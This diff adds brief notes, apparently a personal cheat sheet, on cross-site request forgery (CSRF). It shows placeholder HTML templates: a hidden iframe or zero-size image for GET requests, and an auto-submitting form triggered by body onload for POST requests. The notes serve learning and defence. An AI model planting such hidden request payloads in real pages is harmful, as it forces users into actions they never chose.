@@ -1,0 +1,16 @@
+- used to force user to perform an unwanted action
+- uses img, a, iframe, form and javascript to perform the requests
+
+-- GET --
+<a href="link">malicious link</a>
+<iframe src="link"></iframe> or <img src="link" width="0" height="0" border="0">
+
+-- POST --
+<body onload="document.forms[0].submit()">
+...
+<form action="link" method="post">hidden data</form>
+</body>
+
+-- PUT, DELETE ... --
+load inline javascript and perform some actions in there
+note that this might not work due to the same origin policy
